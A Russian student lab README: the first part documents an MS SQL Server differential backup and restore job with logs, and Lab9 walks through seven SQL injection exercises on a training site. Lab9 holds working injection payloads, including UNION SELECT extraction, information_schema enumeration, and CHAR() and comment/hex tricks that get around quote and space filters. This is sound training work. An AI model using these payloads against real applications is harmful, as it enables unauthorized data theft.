MOVE 'TestDB' TO 'C:\MS SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\DiffBackupTestDB.mdf',
MOVE 'TestDB_log' TO 'C:\MS SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\DiffBackupTestDB_log.ldf',
RECOVERY
GO
```

Настройки расписания:
![image](https://github.com/user-attachments/assets/4777166c-247d-4c4c-9998-89134591e5a4)

Файлы логов за несколько запусков:
```txt
Задание "DB_Diff_Backup(task2)": шаг 1, "Создание дифф. копии": началось выполнение 2024-12-15 00:33:15
Обработано 56 страниц для базы данных "TestDB", файл "TestDB" для файла 21. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 21. [SQLSTATE 01000]
BACKUP DATABASE WITH DIFFERENTIAL успешно обработал 58 страниц за 0.015 секунд (29.947 MБ/сек). [SQLSTATE 01000]
Задание "DB_Diff_Backup(task2)": шаг 2, "Копирование .bak" 'C:\Backup(Task2)\SourceBak\TestDBdiff.bak' в 'C:\Backup(Task2)\TargetBak\' завершено успешно.
Задание "DB_Diff_Backup(task2)": шаг 3, "Восстановление новой БД": началось выполнение 2024-12-15 00:33:16
Обработано 528 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 33. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 33. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 530 страниц за 0.012 секунд (344.726 MБ/сек). [SQLSTATE 01000]
Обработано 56 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 21. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 21. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 58 страниц за 0.007 секунд (64.174 MБ/сек). [SQLSTATE 01000]

Задание "DB_Diff_Backup(task2)": шаг 1, "Создание дифф. копии": началось выполнение 2024-12-15 00:33:23
Обработано 56 страниц для базы данных "TestDB", файл "TestDB" для файла 22. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 22. [SQLSTATE 01000]
BACKUP DATABASE WITH DIFFERENTIAL успешно обработал 58 страниц за 0.018 секунд (24.956 MБ/сек). [SQLSTATE 01000]
Задание "DB_Diff_Backup(task2)": шаг 2, "Копирование .bak" 'C:\Backup(Task2)\SourceBak\TestDBdiff.bak' в 'C:\Backup(Task2)\TargetBak\' завершено успешно.
Задание "DB_Diff_Backup(task2)": шаг 3, "Восстановление новой БД": началось выполнение 2024-12-15 00:33:24
Обработано 528 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 33. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 33. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 530 страниц за 0.012 секунд (344.726 MБ/сек). [SQLSTATE 01000]
Обработано 56 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 22. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 22. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 58 страниц за 0.007 секунд (64.174 MБ/сек). [SQLSTATE 01000]

Задание "DB_Diff_Backup(task2)": шаг 1, "Создание дифф. копии": началось выполнение 2024-12-15 00:33:32
Обработано 56 страниц для базы данных "TestDB", файл "TestDB" для файла 23. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 23. [SQLSTATE 01000]
BACKUP DATABASE WITH DIFFERENTIAL успешно обработал 58 страниц за 0.016 секунд (28.076 MБ/сек). [SQLSTATE 01000]
Задание "DB_Diff_Backup(task2)": шаг 2, "Копирование .bak" 'C:\Backup(Task2)\SourceBak\TestDBdiff.bak' в 'C:\Backup(Task2)\TargetBak\' завершено успешно.
Задание "DB_Diff_Backup(task2)": шаг 3, "Восстановление новой БД": началось выполнение 2024-12-15 00:33:32
Обработано 528 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 33. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 33. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 530 страниц за 0.010 секунд (413.671 MБ/сек). [SQLSTATE 01000]
Обработано 56 страниц для базы данных "DiffBackupTestDB", файл "TestDB" для файла 23. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "DiffBackupTestDB", файл "TestDB_log" для файла 23. [SQLSTATE 01000]
RESTORE DATABASE успешно обработал 58 страниц за 0.006 секунд (74.869 MБ/сек). [SQLSTATE 01000]
```

Работа с Maintance Plan

Задание 1

Шаг 1
![Task1](https://github.com/user-attachments/assets/6b8369bc-6ede-4e21-ab19-f98110146db2)

Шаг 2
![image](https://github.com/user-attachments/assets/68579adf-8425-4ff3-ad86-f2b2015cf6d6)

![image](https://github.com/user-attachments/assets/9be8c0c1-32d4-477a-ba60-fc6ab532753a)

Задание 2

Шаг 1
![Task2](https://github.com/user-attachments/assets/cc09b4f3-d4ba-4ff6-b479-f5d2394c399e)

Шаг 2
![image](https://github.com/user-attachments/assets/68579adf-8425-4ff3-ad86-f2b2015cf6d6)

Шаг 3
![image](https://github.com/user-attachments/assets/4de7a6fd-2976-46ef-88e2-a6dcc54b1dd2)

![image](https://github.com/user-attachments/assets/7647601f-a706-4eff-afaa-cedcf0e20525)


# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab9
<h3 align="center">
  <a href="#client"></a>
  Выполнение первых 7 задач с сайта https://sql.training.hackerdom.ru/
</h3>

№1
```tsql
-- Обычный запрос на выборку таблицы
SELECT * FROM users
```

![1](https://github.com/user-attachments/assets/d8574bed-3da6-4739-8381-d9a31f9a353c)

№2
```tsql
-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
' OR id=9 #
```

![Решение](https://github.com/user-attachments/assets/afc41efd-4aea-440f-a370-a05a346dc08d)

№3
```tsql
-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
' OR id=13 #
```

![image](https://github.com/user-attachments/assets/40d44525-461f-420b-bb40-9f2e9f0f875a)

№4
```tsql
-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
' UNION SELECT * FROM secret WHERE ggg='abc' # 
```

![Решение](https://github.com/user-attachments/assets/ef6248a9-53db-424d-aab1-4303f9881930)

№5
```tsql
-- Используем обращение к системной схеме для получения названий столбцов в таблице secret - dfgfddfgdfdfdf и dfgdfgfdg
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='secret' # 
```

![Шаг1](https://github.com/user-attachments/assets/588738da-dc3b-4c09-bbc7-48bc40cc5c8e)


```tsql
-- Получаем данные из таблицы secret
' UNION SELECT 1, dfgfddfgdfdfdf, dfgdfgfdg FROM secret # 
```

![image](https://github.com/user-attachments/assets/e971fc2a-4bf7-4905-a0fc-e484f1ec4252)

№6
```tsql
-- CHAR(103,111,100) - это ASCII коды для символов 'g', 'o' и 'd', что может обойти фильтрацию кавычек. 0 для того, чтобы убрать записи из первой части условия
0 OR login=CHAR(103,111,100)
```

![image](https://github.com/user-attachments/assets/dd50aada-1190-4414-83d0-cdff8453836e)

№7
```tsql
-- С помощью блоков комментариев /**/ обходим запрет на использование пробелов. 0x2567656e746f6f25 - hex код искомой подстроки
0/**/or/**/login/**/like/**/0x2567656e746f6f25
```

![image](https://github.com/user-attachments/assets/376a811d-f48d-4afd-acea-6f48c3529c5f)
